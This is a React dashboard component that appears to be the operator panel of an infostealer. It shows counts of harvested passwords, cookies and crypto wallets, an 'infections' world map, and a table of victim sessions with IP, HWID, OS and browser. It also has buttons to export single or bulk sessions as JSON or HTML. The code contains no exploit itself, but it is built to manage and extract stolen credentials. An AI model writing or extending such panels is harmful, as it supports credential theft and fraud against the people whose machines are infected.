import { useState, useCallback } from 'react'
import { useNavigate } from 'react-router-dom'
import { motion, MotionConfig } from 'motion/react'
import {
  Database, Key, Cookie, Wallet, Globe, Copy, AlertTriangle,
  TrendingUp, TrendingDown, Search, Download, ChevronLeft, ChevronRight, X,
} from 'lucide-react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { FlagIcon } from '@/components/charts/flag-icon'
import { WorldMap } from '@/components/charts/world-map'
import { TopCountries } from '@/components/charts/top-countries'
import { OSChart } from '@/components/charts/os-chart'
import { useDashboard } from '@/hooks/use-dashboard'
import { useI18n, type TranslationKey } from '@/lib/i18n'
import { useQuery, keepPreviousData } from '@tanstack/react-query'
import { api } from '@/lib/api'
import { cn } from '@/lib/utils'
import type { SessionPage, StatsResponse } from '@/types'

type KpiKey = 'total_logs' | 'new_today' | 'quality' | 'passwords' | 'countries' | 'cookies' | 'wallets' | 'duplicates'

function KpiCard({ labelKey, value, subValue, trend, icon: Icon }: {
  labelKey: TranslationKey
  value: string
  subValue?: string
  trend?: number
  icon: typeof Database
}) {
  const { t } = useI18n()
  const positive = (trend ?? 0) >= 0
  return (
    <Card className="relative overflow-hidden">
      <CardHeader className="flex flex-row items-center justify-between pb-2 space-y-0">
        <CardTitle>{t(labelKey)}</CardTitle>
        <Icon className="h-4 w-4 text-muted-foreground" strokeWidth={1.5} />
      </CardHeader>
      <CardContent>
        <div className="flex items-baseline gap-2">
          <motion.span
            key={value}
            initial={{ opacity: 0, y: 4 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.32, ease: [0.16, 1, 0.3, 1] }}
            className="mono text-[26px] leading-none tracking-tight text-foreground tabular-nums"
          >
            {value}
          </motion.span>
          {trend !== undefined && (
            <span className={cn(
              'mono text-[11px] tabular-nums flex items-center gap-0.5',
              positive ? 'text-status-online' : 'text-status-error',
            )}>
              {positive ? <TrendingUp className="h-3 w-3" /> : <TrendingDown className="h-3 w-3" />}
              {positive ? '+' : ''}{trend.toFixed(1)}%
            </span>
          )}
        </div>
        {subValue && (
          <p className="text-[11px] text-muted-foreground mt-1.5 mono">{subValue}</p>
        )}
      </CardContent>
    </Card>
  )
}

function fmtNum(n: number | undefined | null): string {
  return (n ?? 0).toLocaleString()
}

function formatDate(iso: string | undefined): string {
  if (!iso) return '—'
  const d = new Date(iso)
  if (isNaN(d.getTime())) return '—'
  return d.toLocaleString(undefined, { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })
}

export default function Dashboard() {
  const navigate = useNavigate()
  const { t } = useI18n()
  const { stats } = useDashboard()
  const data: StatsResponse | undefined = stats.data
  const isLoading = stats.isLoading

  // Latest logs state
  const [page, setPage] = useState(1)
  const [pageSize, setPageSize] = useState(5)
  const [search, setSearch] = useState('')
  const [country, setCountry] = useState('')
  const [os, setOs] = useState('')
  const [unviewedOnly, setUnviewedOnly] = useState(false)
  const [selected, setSelected] = useState<Set<string>>(new Set())

  const sessionsQuery = useQuery<SessionPage>({
    queryKey: ['sessions', { page, pageSize, search, country, os, unviewedOnly }],
    queryFn: () => api.get<SessionPage>('/api/sessions', {
      page,
      limit: pageSize,
      sort: 'created_at',
      order: 'desc',
      q: search || undefined,
      country: country || undefined,
      os: os || undefined,
      unviewed_only: unviewedOnly || undefined,
    }),
    placeholderData: keepPreviousData,
    refetchInterval: 15000,
  })

  const sessions = sessionsQuery.data?.sessions ?? sessionsQuery.data?.items ?? []
  const total = sessionsQuery.data?.total ?? 0
  const pages = sessionsQuery.data?.pages ?? Math.max(1, Math.ceil(total / pageSize))

  const toggleSelected = useCallback((id: string) => {
    setSelected(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id)
      else next.add(id)
      return next
    })
  }, [])

  const exportOne = useCallback((id: string, format: 'json' | 'html') => {
    const url = `/api/export/session/${id}?format=${format}`
    const token = localStorage.getItem('token')
    fetch(url, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => r.blob())
      .then(blob => {
        const a = document.createElement('a')
        a.href = URL.createObjectURL(blob)
        a.download = `session-${id}.${format}`
        a.click()
        URL.revokeObjectURL(a.href)
      })
  }, [])

  const exportBulk = useCallback((ids: string[], format: 'json' | 'html') => {
    const token = localStorage.getItem('token')
    fetch('/api/export/bulk', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
      body: JSON.stringify({ session_ids: ids, format }),
    }).then(r => r.blob()).then(blob => {
      const a = document.createElement('a')
      a.href = URL.createObjectURL(blob)
      a.download = `sessions-bulk.${format}`
      a.click()
      URL.revokeObjectURL(a.href)
    })
  }, [])

  if (isLoading || !data) {
    return (
      <div className="space-y-4">
        <div className="grid gap-4 grid-cols-2 md:grid-cols-4">
          {Array.from({ length: 8 }).map((_, i) => (
            <div key={i} className="border border-border bg-card h-[104px]" />
          ))}
        </div>
        <div className="border border-border bg-card h-[400px]" />
      </div>
    )
  }

  if (data.sessions.total === 0) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[70vh] gap-6">
        <div className="h-16 w-16 border border-border flex items-center justify-center">
          <Database className="h-7 w-7 text-muted-foreground" strokeWidth={1.5} />
        </div>
        <div className="text-center space-y-2">
          <h2 className="font-display text-2xl tracking-[-0.02em]">{t('dashboard.no_data')}</h2>
          <p className="text-[13px] text-muted-foreground max-w-md">{t('dashboard.no_data_desc')}</p>
        </div>
      </div>
    )
  }

  const dupTotal = (data.duplicates?.hwid ?? 0) + (data.duplicates?.ip ?? 0)
  const qualityPct = Math.round(data.quality?.percentage ?? 0)

  const kpis: { key: KpiKey; value: string; sub: string; trend: number; icon: typeof Database }[] = [
    { key: 'total_logs', value: fmtNum(data.sessions.total), sub: t('dashboard.today', { n: fmtNum(data.sessions.today) }), trend: data.sessions.change, icon: Database },
    { key: 'new_today', value: fmtNum(data.sessions.today), sub: `${fmtNum(data.sessions.yesterday)} ${t('dashboard.vs_yesterday', { pct: '0' }).split('{pct}').join('')}`, trend: data.sessions.change, icon: TrendingUp },
    { key: 'quality', value: `${qualityPct}%`, sub: t('dashboard.quality_score', { n: fmtNum(data.quality?.valid) }), trend: 0, icon: AlertTriangle },
    { key: 'passwords', value: fmtNum(data.passwords.total ?? 0), sub: t('dashboard.today', { n: fmtNum(data.passwords.today ?? 0) }), trend: data.passwords.change ?? 0, icon: Key },
    { key: 'countries', value: fmtNum(data.countries), sub: `${fmtNum(data.sessions.total)} ${t('nav.logs').toLowerCase()}`, trend: 0, icon: Globe },
    { key: 'cookies', value: fmtNum(data.cookies.total ?? 0), sub: t('dashboard.today', { n: fmtNum(data.cookies.today ?? 0) }), trend: data.cookies.change ?? 0, icon: Cookie },
    { key: 'wallets', value: fmtNum(data.wallets.total), sub: `${fmtNum(data.geo.length)} ${t('dashboard.countries').toLowerCase()}`, trend: 0, icon: Wallet },
    { key: 'duplicates', value: fmtNum(dupTotal), sub: `${fmtNum(data.duplicates?.hwid ?? 0)} hwid / ${fmtNum(data.duplicates?.ip ?? 0)} ip`, trend: 0, icon: Copy },
  ]

  const start = total === 0 ? 0 : (page - 1) * pageSize + 1
  const end = Math.min(page * pageSize, total)
  const allSelected = sessions.length > 0 && sessions.every(s => selected.has(s.id))
  const someSelected = selected.size > 0

  return (
    <MotionConfig reducedMotion="user">
      <div className="space-y-4">
        {/* KPI grid */}
        <div className="grid gap-4 grid-cols-2 md:grid-cols-4">
          {kpis.map((k, i) => (
            <motion.div
              key={k.key}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.32, ease: [0.16, 1, 0.3, 1], delay: i * 0.04 }}
            >
              <KpiCard
                labelKey={`dashboard.${k.key}` as TranslationKey}
                value={k.value}
                subValue={k.sub}
                trend={k.trend}
                icon={k.icon}
              />
            </motion.div>
          ))}
        </div>

      {/* Map + Countries + OS row — equal-height cards, denser 4-col layout */}
      <div className="grid gap-4 grid-cols-1 md:grid-cols-2 lg:grid-cols-4 items-stretch">
        <Card className="lg:col-span-2 flex flex-col">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle>{t('dashboard.infections_map')}</CardTitle>
            <span className="text-[10px] mono text-muted-foreground/70">{fmtNum(data.geo.length)}</span>
          </CardHeader>
          <CardContent className="flex-1 min-h-0 p-0 px-5 pb-5">
            <WorldMap data={data.geo} isLoading={isLoading} />
          </CardContent>
        </Card>

        <Card className="flex flex-col">
          <CardHeader>
            <CardTitle>{t('dashboard.top_countries')}</CardTitle>
          </CardHeader>
          <CardContent className="flex-1 min-h-0 overflow-auto">
            <TopCountries data={data.geo} isLoading={isLoading} />
          </CardContent>
        </Card>

        <Card className="flex flex-col">
          <CardHeader>
            <CardTitle>{t('dashboard.top_os')}</CardTitle>
          </CardHeader>
          <CardContent className="flex-1 min-h-0 overflow-auto">
            <OSChart
              data={data.os_distribution}
              isLoading={isLoading}
              selectedOs={os}
              onSelect={(next) => { setOs(next); setPage(1) }}
            />
          </CardContent>
        </Card>
      </div>

        {/* Latest logs with full table controls */}
        <Card>
          <CardHeader className="flex flex-col items-stretch gap-3 space-y-0">
            <div className="flex flex-row items-center justify-between">
              <CardTitle>{t('dashboard.latest_logs')}</CardTitle>
              <span className="text-[10px] mono text-muted-foreground/70">{fmtNum(total)} total</span>
            </div>
          <div className="flex flex-col md:flex-row gap-2 md:items-center">
            <div className="relative flex-1">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
              <input
                type="text"
                value={search}
                onChange={e => { setSearch(e.target.value); setPage(1) }}
                placeholder={t('dashboard.search_placeholder')}
                className="h-8 w-full pl-8 pr-3 border border-border bg-background text-[12px] text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-foreground transition-colors"
              />
            </div>

            <select
              value={country}
              onChange={e => { setCountry(e.target.value); setPage(1) }}
              className="h-8 px-2 border border-border bg-background text-[12px] text-foreground focus:outline-none focus:border-foreground"
            >
              <option value="">{t('dashboard.all_countries')}</option>
              {data.geo.map(g => (
                <option key={g.country_code} value={g.country_code}>{g.country_code}</option>
              ))}
            </select>

            <select
              value={os}
              onChange={e => { setOs(e.target.value); setPage(1) }}
              className="h-8 px-2 border border-border bg-background text-[12px] text-foreground focus:outline-none focus:border-foreground"
            >
              <option value="">{t('dashboard.all_os')}</option>
              {data.os_distribution.map(o => (
                <option key={o.os || 'unknown'} value={o.os}>{o.os || '—'}</option>
              ))}
            </select>

            <label className="flex items-center gap-1.5 h-8 px-2 border border-border text-[12px] text-muted-foreground cursor-pointer hover:text-foreground">
              <input
                type="checkbox"
                checked={unviewedOnly}
                onChange={e => { setUnviewedOnly(e.target.checked); setPage(1) }}
                className="size-3.5 accent-foreground"
              />
              {t('dashboard.unviewed_only')}
            </label>

            <div className="flex items-center gap-1">
              {someSelected && (
                <>
                  <Button size="sm" variant="outline" onClick={() => exportBulk(Array.from(selected), 'json')} className="h-8 text-[11px]">
                    <Download className="h-3 w-3" /> {t('dashboard.export_json')}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => exportBulk(Array.from(selected), 'html')} className="h-8 text-[11px]">
                    <Download className="h-3 w-3" /> {t('dashboard.export_html')}
                  </Button>
                </>
              )}
              <Button
                size="sm"
                variant="ghost"
                onClick={() => { setSearch(''); setCountry(''); setOs(''); setUnviewedOnly(false); setPage(1) }}
                className="h-8 text-[11px] text-muted-foreground hover:text-foreground"
              >
                <X className="h-3 w-3" />
              </Button>
            </div>
          </div>
        </CardHeader>

        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead>
                <tr className="border-y border-border text-muted-foreground">
                  <th className="text-left py-2 px-3 w-8">
                    <input
                      type="checkbox"
                      checked={allSelected}
                      onChange={() => {
                        if (allSelected) setSelected(new Set())
                        else setSelected(new Set(sessions.map(s => s.id)))
                      }}
                      className="size-3.5 accent-foreground"
                    />
                  </th>
                  <th className="text-left py-2 px-3 font-medium">ID</th>
                  <th className="text-left py-2 px-3 font-medium">IP</th>
                  <th className="text-left py-2 px-3 font-medium">{t('sessions.all_countries').replace('Все ', '').replace('All ', '')}</th>
                  <th className="text-left py-2 px-3 font-medium">OS</th>
                  <th className="text-left py-2 px-3 font-medium">{t('dashboard.latest_logs') === 'Latest Logs' ? 'Browser' : 'Браузер'}</th>
                  <th className="text-left py-2 px-3 font-medium">{t('dashboard.passwords')}</th>
                  <th className="text-left py-2 px-3 font-medium">{t('dashboard.cookies')}</th>
                  <th className="text-left py-2 px-3 font-medium">{t('dashboard.wallets')}</th>
                  <th className="text-left py-2 px-3 font-medium">HWID</th>
                  <th className="text-left py-2 px-3 font-medium">{t('common.created')}</th>
                  <th className="text-right py-2 px-3 font-medium">{t('common.actions')}</th>
                </tr>
              </thead>
              <tbody>
                {sessionsQuery.isLoading ? (
                  Array.from({ length: 8 }).map((_, i) => (
                    <tr key={i} className="border-b border-border/50">
                      {Array.from({ length: 12 }).map((__, j) => (
                        <td key={j} className="py-2.5 px-3">
                          <div className="h-3 w-12 bg-muted animate-pulse" />
                        </td>
                      ))}
                    </tr>
                  ))
                ) : sessions.length === 0 ? (
                  <tr>
                    <td colSpan={12} className="text-center py-12 text-muted-foreground text-sm">
                      {t('dashboard.no_results')}
                    </td>
                  </tr>
                ) : (
                  sessions.map((s, i) => (
                    <motion.tr
                      key={s.id}
                      initial={{ opacity: 0, x: -4 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ duration: 0.2, ease: [0.16, 1, 0.3, 1], delay: Math.min(i, 12) * 0.04 }}
                      className={cn(
                        'border-b border-border/50 hover:bg-accent/30 transition-colors cursor-pointer',
                        !s.viewed && 'bg-foreground/[0.02]',
                        selected.has(s.id) && 'bg-accent/60',
                      )}
                      onClick={() => navigate(`/sessions/${s.id}`)}
                    >
                      <td className="py-2.5 px-3" onClick={e => { e.stopPropagation(); toggleSelected(s.id) }}>
                        <input
                          type="checkbox"
                          checked={selected.has(s.id)}
                          onChange={() => toggleSelected(s.id)}
                          className="size-3.5 accent-foreground"
                        />
                      </td>
                      <td className="py-2.5 px-3 mono text-muted-foreground">{s.id.slice(0, 8)}</td>
                      <td className="py-2.5 px-3 mono">{s.ip || '—'}</td>
                      <td className="py-2.5 px-3">
                        <div className="flex items-center gap-1.5">
                          {s.country_code && <FlagIcon country={s.country_code} width={14} height={14} />}
                          <span className="mono">{s.country_code || '—'}</span>
                        </div>
                      </td>
                      <td className="py-2.5 px-3 text-muted-foreground">{s.os || '—'}</td>
                      <td className="py-2.5 px-3 text-muted-foreground">{s.browser || '—'}</td>
                      <td className="py-2.5 px-3 mono tabular-nums">{s.passwords_count ?? 0}</td>
                      <td className="py-2.5 px-3 mono tabular-nums">{s.cookies_count ?? 0}</td>
                      <td className="py-2.5 px-3 mono tabular-nums">{s.wallets_count ?? 0}</td>
                      <td className="py-2.5 px-3 mono text-muted-foreground truncate max-w-[120px]">{s.hwid || '—'}</td>
                      <td className="py-2.5 px-3 text-muted-foreground whitespace-nowrap mono">{formatDate(s.created_at)}</td>
                      <td className="py-2.5 px-3 text-right" onClick={e => e.stopPropagation()}>
                        <div className="flex items-center justify-end gap-1">
                          <Button size="sm" variant="ghost" onClick={() => exportOne(s.id, 'json')} className="h-6 px-1.5 text-[10px]">
                            JSON
                          </Button>
                          <Button size="sm" variant="ghost" onClick={() => exportOne(s.id, 'html')} className="h-6 px-1.5 text-[10px]">
                            HTML
                          </Button>
                        </div>
                      </td>
                    </motion.tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

          {/* Pagination */}
          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-2 px-3 py-2 border-t border-border">
            <div className="flex items-center gap-2 text-[11px] text-muted-foreground">
              <span className="mono">{t('dashboard.showing', { a: start, b: end, t: fmtNum(total) })}</span>
              <span>·</span>
              <select
                value={pageSize}
                onChange={e => { setPageSize(Number(e.target.value)); setPage(1) }}
                className="h-6 px-1.5 border border-border bg-background text-[11px] text-foreground focus:outline-none focus:border-foreground"
              >
                {[10, 25, 50, 100].map(n => (
                  <option key={n} value={n}>{n} / {t('dashboard.per_page')}</option>
                ))}
              </select>
            </div>

            <div className="flex items-center gap-1">
              <Button
                size="sm"
                variant="ghost"
                disabled={page <= 1}
                onClick={() => setPage(p => Math.max(1, p - 1))}
                className="h-7 w-7 p-0"
              >
                <ChevronLeft className="h-3.5 w-3.5" />
              </Button>
              <span className="mono text-[11px] text-muted-foreground px-2 min-w-[80px] text-center">
                {t('dashboard.page_of', { p: page, t: pages })}
              </span>
              <Button
                size="sm"
                variant="ghost"
                disabled={page >= pages}
                onClick={() => setPage(p => Math.min(pages, p + 1))}
                className="h-7 w-7 p-0"
              >
                <ChevronRight className="h-3.5 w-3.5" />
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>
      </div>
    </MotionConfig>
  )
}
